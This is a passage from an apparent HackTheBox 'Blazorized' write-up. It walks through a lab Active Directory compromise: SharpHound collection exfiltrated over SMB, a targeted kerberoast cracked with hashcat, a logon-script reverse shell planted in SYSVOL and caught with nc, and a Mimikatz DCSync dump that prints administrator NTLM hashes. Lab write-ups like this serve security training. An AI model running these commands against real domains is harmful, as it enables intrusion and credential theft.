![image-20241101070618571](/img/image-20241101070618571.png)

That page has the SharpHound binary for download, which I’ll download, unzip, and host `SharpHound.exe` with a Python webserver.

#### Collection

With only a shell and no creds for the box, I’ll need to collect Bloodhound data using something running on Blazorized. I’ve got `SharpHound.exe` from the above, which I’ll upload to Blazorized and run:

```

PS C:\programdata> wget http://10.10.14.6/SharpHound.exe -outfile SharpHound.exe
PS C:\programdata> .\SharpHound.exe -c all
2024-11-01T06:09:19.7721017-05:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2024-11-01T06:09:20.0220952-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2024-11-01T06:09:20.0689718-05:00|INFORMATION|Initializing SharpHound at 6:09 AM on 11/1/2024
2024-11-01T06:09:20.1158490-05:00|INFORMATION|Resolved current domain to blazorized.htb
2024-11-01T06:09:20.2564704-05:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2024-11-01T06:09:20.3970940-05:00|INFORMATION|Beginning LDAP search for blazorized.htb
2024-11-01T06:09:20.5064724-05:00|INFORMATION|Beginning LDAP search for blazorized.htb Configuration NC
2024-11-01T06:09:20.5377221-05:00|INFORMATION|Producer has finished, closing LDAP channel
2024-11-01T06:09:20.5377221-05:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-11-01T06:09:20.5845970-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for BLAZORIZED.HTB
2024-11-01T06:09:20.5845970-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for BLAZORIZED.HTB
2024-11-01T06:09:20.9283450-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for BLAZORIZED.HTB
2024-11-01T06:09:21.4908447-05:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2024-11-01T06:09:21.5220984-05:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-11-01T06:09:21.6627215-05:00|INFORMATION|Status: 313 objects finished (+313 313)/s -- Using 37 MB RAM
2024-11-01T06:09:21.6627215-05:00|INFORMATION|Enumeration finished in 00:00:01.2861155
2024-11-01T06:09:21.7877405-05:00|INFORMATION|Saving cache with stats: 20 ID to type mappings.
 2 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2024-11-01T06:09:21.8346081-05:00|INFORMATION|SharpHound Enumeration Completed at 6:09 AM on 11/1/2024! Happy Graphing!

```

The output is a zip archive:

```

PS C:\programdata> ls *.zip

    Directory: C:\programdata

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/1/2024   6:09 AM          26090 20241101060921_BloodHound.zip

```

I’ll start `smbserver.py` on my host creating a share named `share`:

```

oxdf@hacky$ smbserver.py share . -smb2support -username oxdf -password oxdf
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

```

I’ll connect to the share from Blazorized and exfil the collection:

```

PS C:\programdata> net use \\10.10.14.6 /u:oxdf oxdf
The command completed successfully.
PS C:\programdata> copy *.zip \\10.10.14.6\share\

```

#### Load Data

Back in the Bloodhound webpage, under the gear icon I’ll click “Administration” to get to the “File Ingest” page. I’ll click “Upload File(s)” and give it the archive.

![image-20241101071337926](/img/image-20241101071337926.png)

#### Analysis

I’ll click “Explore” and get to the Bloodhound window. I’ll start by finding the user I own, nu\_1055, and marking them as owned. The first thing I always look at is “Outbound Object Control”:

![image-20241101071514385](/img/image-20241101071514385.png)

Clicking on it adds RSA\_4810 to the graph:

![image-20241101071541189](/img/image-20241101071541189.png)

nu\_1055 has `WriteSPN` over the RSA\_4810 user.

### Targeted Kerberoast

#### Background

A Service Principal Name (SPN) is a unique identifier that associates a service instance with a service account in Kerberos.

Kerberoasting is an attack where an authenticated user requests a ticket for a service by it’s SPN, and the ticket that comes back is encrypted with the password of the user associated with that service. If that password is weak, it can be broken in offline brute force.

To perform a targeted kerberoast, I’ll assign an SPN to the RSA\_4810 account. Then I can request a ticket as that fake service, and get a ticket encrypted with RSA\_4810’s password to crack.

The full process for performing this attack from Windows is given in the “Windows Abuse” section of the right hand panel in Bloodhound when I click on `WriteSPN`:

![image-20241101072247635](/img/image-20241101072247635.png)

#### Exploit

I’ll need [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to run the commands above. I’ll download it to my host, server it with Python, and upload it to Blazorized. Next I’ll import it:

```

PS C:\programdata> . .\PowerView.ps1

```

Now I’ll set the SPN on the user:

```

PS C:\programdata> Set-DomainObject -Identity RSA_4810 -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

```

And get a ticket, outputting the hash:

```

PS C:\programdata> Get-DomainUSer RSA_4810 | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
$krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLAHBLAH*$5AB431F9A16255580AC64A945C3EE2EF$AE1E3FA9D3DD4523FC011F824BEAF1ADD4B48765084C51B09AE51B988B33ADE938DCCA763FD88D3DA29D0666A0198A105921ED200782D01241117A7222C98C9717FBAEADB79DF75811F45F769CDB1F80E8A2EA73999CB894BB7CC833F7DFE752A9F61684FB39AB3E9ADA2609EB336635D7050C9A68881A8018FF5941CCFA7FE381C272CFAD3901588AA892490D2A59E3E4C4056E811AAA2E8200C686156BB78202FAC986A8C9799FC7DA0E4AF126154234420697B65115DC3116DD3958A6AF6206D483A572CC368428F8B38FB00BA17BBAB46D3CE277DB8A14D51B3AE92F8D41632EC88139A13D6A2FBD08417BC74C21ADE120E7226620A2499E98EAAF308E5EAF3430E6D82713DF5754DEA62857885455DBD482A174406DBF03681EC41AB964F6E88F77139DD0DBDD132F5F785C9BD3FD6A14D441F25380643D0B14EF8052CB89EC19244530868D3EFF7549B190319020066C31E39BE34D6481E4B4949AE8F4441AC55A0F0E35454CD82ACE715D40AA632B19B24E308571CE6AF5AB3F22CFF75792F22B07F13D6A5B65318A2C6C0FF05D193A5BB51ADF3D7568BF544960A476A62E25CBE1E88B5218479A41CB7860AE2DA50D5094F706A702C85A9290C06C7EF2E7CBC2EE40600516A5BD3933613D5154A810D47799E5BD9B3AC80DC5F3CC69128580E7F74563817AF617344533E241F310E0D42F7D057535D40481A620EE28E7E0425B860925A1C69C16B533C4D7512D2B028B5EC9A04157E3852EE934D3CFA9B88F8C4EEAF31B42350E51F10F745E9CC1AFBB1FA2D91BFAF6FB149E93BAF4E06CB9D942A3B78BD13FC2D7A5833D5B901DD197A017EB400F9434833BBA097C0D09F17B35EC84A685276C14CA6FBB5CF361B7810E1B8832FC1F2CBFF50A0E5396052957CE1D38D9C23D05733C1145A3FCFC83F077BF49BE812406246E09E23B0C85ED8C5AFD4137E9643B21F85DF26CBEE0073DD9DDA3D17178654BC8DFFEE39F1F70B48FDA4029A67B6A96AD95E6ABEDB107ED255AC8B4DB45B19296B5905FF3126C50567BDEB6825AE6CD56D9F65133EF8BB0A8C0130878E4F9EB78401D33E9462F9370AB2D3486721A0C3FB38963E166C37F69992A96C6004CBD65D08ACF9B3225EED3A753A14DB6B7D3A7547E8075E56AD5D9CAC891F907F17D0B2E1B87225A5C56B72CC67E9A161A51B60F7DF2DE55CC70D5C7B940386BBD0BFA4079F1F81FEE7B90482B307F819506028910C511890D9897BCFE96BE0FB76DD45D125A773739CA0B6A0EE76945237D8B12ECA112D43F639D690113C6681033CC62A9BAE235A1865C18C170FB3F534EF44E4BD111EF651501AAA168DD58E2F109009A0A51BEF25F96747CF60C1B32696E1F885FF90504C05E24A93A2616DE3DDACE2D2DF46DEBF36DA4BE7F1A972AD48D71863BBB35A3793683380FB61DFF44F36846A2B3EC21635CFAF9D82B23D36EC546344652FFC875D8B2E1805BECCECE6839BAAD3A58D16617F4039108C21AC3622724DEF43B68776C33CC05B5082C807C14D2350FD3BEBD62C59F6C1510D95EE441D32749696195B71D8E34AE8C90D1C7BC1FD6B2D786A72E08858E20F98483C6ECB853B2D3F6782C4BB2DB433B43E623FCFCB8B0A8ABB2D2B929A3AA6EEE6E40C950D51E9F2E9C6C7DFDED56D24D68F67A3F21AC19DA0C9450F9EB53DE59B18A9981892AD2EC9CA38D825FC26F64A4B31A0D677D9509D3DFA3B33EE4106D7AD40E02C08C97513298C1298C1414EF6BF6198335C2709CD1C5BB597F

```

#### Crack Hash

I’ll save that hash to a file on my host and pass it to `hashcat`:

```

$ hashcat rsa_4810.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.
...[snip]...
$krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLAHBLAH*$5ab431f9a16255580ac64a945c3ee2ef$ae1e3fa9d3dd4523fc011f824beaf1add4b48765084c51b09ae51b988b33ade938dcca763fd88d3da29d0666a0198a105921ed200782d01241117a7222c98c9717fbaeadb79df75811f45f769cdb1f80e8a2ea73999cb894bb7cc833f7dfe752a9f61684fb39ab3e9ada2609eb336635d7050c9a68881a8018ff5941ccfa7fe381c272cfad3901588aa892490d2a59e3e4c4056e811aaa2e8200c686156bb78202fac986a8c9799fc7da0e4af126154234420697b65115dc3116dd3958a6af6206d483a572cc368428f8b38fb00ba17bbab46d3ce277db8a14d51b3ae92f8d41632ec88139a13d6a2fbd08417bc74c21ade120e7226620a2499e98eaaf308e5eaf3430e6d82713df5754dea62857885455dbd482a174406dbf03681ec41ab964f6e88f77139dd0dbdd132f5f785c9bd3fd6a14d441f25380643d0b14ef8052cb89ec19244530868d3eff7549b190319020066c31e39be34d6481e4b4949ae8f4441ac55a0f0e35454cd82ace715d40aa632b19b24e308571ce6af5ab3f22cff75792f22b07f13d6a5b65318a2c6c0ff05d193a5bb51adf3d7568bf544960a476a62e25cbe1e88b5218479a41cb7860ae2da50d5094f706a702c85a9290c06c7ef2e7cbc2ee40600516a5bd3933613d5154a810d47799e5bd9b3ac80dc5f3cc69128580e7f74563817af617344533e241f310e0d42f7d057535d40481a620ee28e7e0425b860925a1c69c16b533c4d7512d2b028b5ec9a04157e3852ee934d3cfa9b88f8c4eeaf31b42350e51f10f745e9cc1afbb1fa2d91bfaf6fb149e93baf4e06cb9d942a3b78bd13fc2d7a5833d5b901dd197a017eb400f9434833bba097c0d09f17b35ec84a685276c14ca6fbb5cf361b7810e1b8832fc1f2cbff50a0e5396052957ce1d38d9c23d05733c1145a3fcfc83f077bf49be812406246e09e23b0c85ed8c5afd4137e9643b21f85df26cbee0073dd9dda3d17178654bc8dffee39f1f70b48fda4029a67b6a96ad95e6abedb107ed255ac8b4db45b19296b5905ff3126c50567bdeb6825ae6cd56d9f65133ef8bb0a8c0130878e4f9eb78401d33e9462f9370ab2d3486721a0c3fb38963e166c37f69992a96c6004cbd65d08acf9b3225eed3a753a14db6b7d3a7547e8075e56ad5d9cac891f907f17d0b2e1b87225a5c56b72cc67e9a161a51b60f7df2de55cc70d5c7b940386bbd0bfa4079f1f81fee7b90482b307f819506028910c511890d9897bcfe96be0fb76dd45d125a773739ca0b6a0ee76945237d8b12eca112d43f639d690113c6681033cc62a9bae235a1865c18c170fb3f534ef44e4bd111ef651501aaa168dd58e2f109009a0a51bef25f96747cf60c1b32696e1f885ff90504c05e24a93a2616de3ddace2d2df46debf36da4be7f1a972ad48d71863bbb35a3793683380fb61dff44f36846a2b3ec21635cfaf9d82b23d36ec546344652ffc875d8b2e1805beccece6839baad3a58d16617f4039108c21ac3622724def43b68776c33cc05b5082c807c14d2350fd3bebd62c59f6c1510d95ee441d32749696195b71d8e34ae8c90d1c7bc1fd6b2d786a72e08858e20f98483c6ecb853b2d3f6782c4bb2db433b43e623fcfcb8b0a8abb2d2b929a3aa6eee6e40c950d51e9f2e9c6c7dfded56d24d68f67a3f21ac19da0c9450f9eb53de59b18a9981892ad2ec9ca38d825fc26f64a4b31a0d677d9509d3dfa3b33ee4106d7ad40e02c08c97513298c1298c1414ef6bf6198335c2709cd1c5bb597f:(Ni7856Do9854Ki05Ng0005 #)
...[snip]...

```

It auto-detects the hash format, and in about 4 seconds finds the password “(Ni7856Do9854Ki05Ng0005 #)”.

### Shell

#### Validate Creds

The creds work over SMB:

```

oxdf@hacky$ netexec smb blazorized.htb -u rsa_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.22     445    DC1              [+] blazorized.htb\rsa_4810:(Ni7856Do9854Ki05Ng0005 #) 

```

They also work over WinRM:

```

oxdf@hacky$ netexec winrm blazorized.htb -u rsa_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
WINRM       10.10.11.22     5985   DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:blazorized.htb)
WINRM       10.10.11.22     5985   DC1              [+] blazorized.htb\rsa_4810:(Ni7856Do9854Ki05Ng0005 #) (Pwn3d!)

```

I could also see this from the shell as nu\_1055 as rsa\_4810 is in the Remote Management Users group:

```

PS C:\programdata> net user rsa_4810
User name                    RSA_4810
Full Name                    RSA_4810
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/25/2024 12:55:59 PM
Password expires             Never
Password changeable          2/26/2024 12:55:59 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/2/2024 12:44:30 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Remote_Support_Admini
The command completed successfully.

```

#### Evil-WinRM

I’ll connect with `evil-winrm`:

```

oxdf@hacky$ evil-winrm -i blazorized.htb -u rsa_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\RSA_4810\Documents>

```

## Shell as SSA\_6010

### Enumeration

#### Groups

rsa\_4810 is a member of a unique group, Remote\_Support\_Administrators:

```
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
BLAZORIZED\Remote_Support_Administrators    Group            S-1-5-21-2039403211-964143010-2924010611-1115 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

#### Writable Directories

[accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from Sysinternals is a nice way to check for writable directories. I’ll check for any in `C:\Windows`, and it finds a bunch:

```
*Evil-WinRM* PS C:\programdata> .\accesschk64 /accepteula -uwds blazorized\rsa_4810 C:\Windows

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

RW C:\Windows\Tasks
RW C:\Windows\tracing
RW C:\Windows\Registration\CRMLog
 W C:\Windows\System32\Tasks
RW C:\Windows\System32\spool\drivers\color
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\21FDFAAFC1D0
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\23010E0A1A33
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\2BECF3DC0B3D
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\2F3FCC01E0A3
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\3DACA30B03D1
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\3EAF2A3E0CED
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\A3F211DCB11D
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\AADE1BA2A3E3
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\AC2210DC311B
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\B2ACCF2BABFB
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\BE11A3E0EA13
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\BFDDF0E1B33E
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\C20F1322FB3C
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\CD102CDEFD0E
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\CED022B22EBA
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\D0ECECBC1CCF
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\F1D30FCB0100
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\FD33C0CE11AC
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0F0FF1F01DBF
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\313B3BF1ABEA
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\33EFC003BFDB
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\BA30A33F3FC2
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\BBD2AC3ADBAF
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2ADC3DABD0A
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2C2BEC23A2E
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\EF2ADE3B1EFB
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\EFD0F2FDA32B
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\02D21CCC0ADD
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\03B10A11ABB0
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\0BF00013FEFE
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\3A3ED3232FEB
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\3CFD3DD1BCFA
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\AEE0FC3CA30F
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BA3A12ADA1BB
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BBD0B0FAFDAF
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BEC23D3B2F2A
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C10CDDE211FE
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C2FE12102303
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\DE3FC3AD20F0
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\EA1EBECD3ADA
...[snip]...

```

There’s a ton of output, but the important bit is that rsa\_4810 seems to have full control over these two directories:

```
*Evil-WinRM* PS C:\> icacls \Windows\SYSVOL\domain\scripts\A32FF3AEAA23
\Windows\SYSVOL\domain\scripts\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
                                            BLAZORIZED\Administrator:(OI)(CI)(F)
                                            BUILTIN\Administrators:(I)(F)
                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\> icacls \Windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23
\Windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
BLAZORIZED\Administrator:(OI)(CI)(F)
                                                           BUILTIN\Administrators:(I)(F)
                                                           CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                                           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                                                           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                           BUILTIN\Server Operators:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files

```

These are the directories typically used to store logon, logoff, startup, and shutdown scripts applied to users and computers in the domain.

#### Users

The only remaining users with home directories are ssa\_6010 and administrator. Looking at bit more closely, I’ll see that Bloodhound reports that ssa\_6010 has a session on DC1:

![image-20241101093446152](/img/image-20241101093446152.png)

The Last Logon time is also today, within a few minutes of the Bloodhound collection:

![image-20241101093526489](/img/image-20241101093526489.png)

PowerShell can show this as well:

```
*Evil-WinRM* PS C:\> [DateTime]::FromFileTime((Get-ADUser SSA_6010 -properties LastLogon).LastLogon)
Friday, November 1, 2024 8:36:43 AM
*Evil-WinRM* PS C:\> date
Friday, November 1, 2024 8:37:11 AM

```

It seems that ssa\_6010 logs on every minute.

#### Logon Script

The SSA\_6010 user doesn’t have any logon script set in their active directory configuration information:

```
*Evil-WinRM* PS C:\users> Get-ADUser SSA_6010 -properties ScriptPath

DistinguishedName : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
Enabled           : True
GivenName         :
Name              : SSA_6010
ObjectClass       : user
ObjectGUID        : 8bf3166b-e716-4f91-946c-174e1fb433ed
SamAccountName    : SSA_6010
ScriptPath        :
SID               : S-1-5-21-2039403211-964143010-2924010611-1124
Surname           :
UserPrincipalName : SSA_6010@blazorized.htb

```

However, RSA\_4810 is able to set one:

```
*Evil-WinRM* PS C:\users> Get-ADUser SSA_6010 | Set-ADUser -ScriptPath 0xdf
*Evil-WinRM* PS C:\users> Get-ADUser SSA_6010 -properties ScriptPath

DistinguishedName : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
Enabled           : True
GivenName         :
Name              : SSA_6010
ObjectClass       : user
ObjectGUID        : 8bf3166b-e716-4f91-946c-174e1fb433ed
SamAccountName    : SSA_6010
ScriptPath        : 0xdf
SID               : S-1-5-21-2039403211-964143010-2924010611-1124
Surname           :
UserPrincipalName : SSA_6010@blazorized.htb

```

Another way to find this while enumerating is with the `Find-InterestingDomainAcl` commandlet from [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). If I run it and filter for ones that come from RSA\_4810, I’ll see that this user has `WriteProperty` access to SSA\_6010’s `Script-Path`:

```
*Evil-WinRM* PS C:\programdata> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RSA_4810"}

ObjectDN                : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : Script-Path
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2039403211-964143010-2924010611-1107
IdentityReferenceName   : RSA_4810
IdentityReferenceDomain : blazorized.htb
IdentityReferenceDN     : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
IdentityReferenceClass  : user

```

### Execution

#### Strategy

Logon scripts are specified relative to the `scripts` directory above. I’m going to set that path to something like `A32FF3AEAA23\0xdf.bat`, and then write that script into place as a reverse shell. When SSA\_6010 logs in, it’ll execute and I’ll get a shell.

#### Payload

I’ll grab a PowerShell #3 (Base64) reverse shell from [revshells.com](https://www.revshells.com/) and write it to a `.bat` file using `Out-File`:

```
*Evil-WinRM* PS C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23> echo "powershell -e JABj...[snip]...CkA" | Out-File -FilePath 0xdf.bat -Encoding ASCII
*Evil-WinRM* PS C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23> ls 0xdf.bat

    Directory: C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/1/2024   8:48 AM           1344 0xdf.bat

```

There is a cleanup script that deletes these files, so I’ll need to move fast.

#### Exploit

I’ll set SSA\_6010’s `ScriptPath`:

```
*Evil-WinRM* PS C:\> Get-ADUser SSA_6010 | Set-ADUser -ScriptPath 'A32FF3AEAA23\0xdf.bat'

```

In less than a minute, I get a shell at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.22 53958

PS C:\Windows\system32> 

```

## Shell as administrator

### Enumeration

SSA\_6010 is a member of the Super\_Support\_Administrators group, which has significant privileges over the domain:

![image-20241101095214040](/img/image-20241101095214040.png)

### Hash Dump

With `DCSync` privileges, SSA\_6010 can dump all the hashes for the domain. I’ve shown this many times before with `secrets-dump` from my host (most recently on [Mist](/2024/10/26/htb-mist.html#secretsdump)). But in this case, I don’t have creds as the user that I want to dump with. I’ll use [MimiKatz](https://github.com/gentilkiwi/mimikatz).

I’ll upload it to `\programdata` (I used my Evil-WinRM shell, but Python webserver would work too). It’s an interactive tool when run as `.\mimikatz.exe`, which in this reverse shell will just hang and/or fail. But I can pass commands in at the command line in the format `mimikatz.exe "[command]" "[command]" exit`.

The `mimikatz` command I want is `lsadump::dcsync /user:administrator`:

```

PS C:\programdata> .\mimikatz "lsadump::dcsync /user:administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:administrator
[DC] 'blazorized.htb' will be the domain
[DC] 'DC1.blazorized.htb' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator
** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/25/2024 12:54:43 PM
Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 1: eecc741ecf81836dcd6128f5c93313f2
    ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3
    ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff
    ntlm- 4: fe57c7727f7c2549dd886159dff0d88a
    ntlm- 5: b471c416c10615448c82a2cbb731efcb
    ntlm- 6: b471c416c10615448c82a2cbb731efcb
    ntlm- 7: aec132eaeee536a173e40572e8aad961
    ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a
    ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: ad37753b9f78b6b98ec3bb65e5995c73
    lm  - 1: c449777ea9b0cd7e6b96dd8c780c98f0
    lm  - 2: ebbe34c80ab8762fa51e04bc1cd0e426
    lm  - 3: 471ac07583666ccff8700529021e4c9f
    lm  - 4: ab4d5d93532cf6ad37a3f0247db1162f
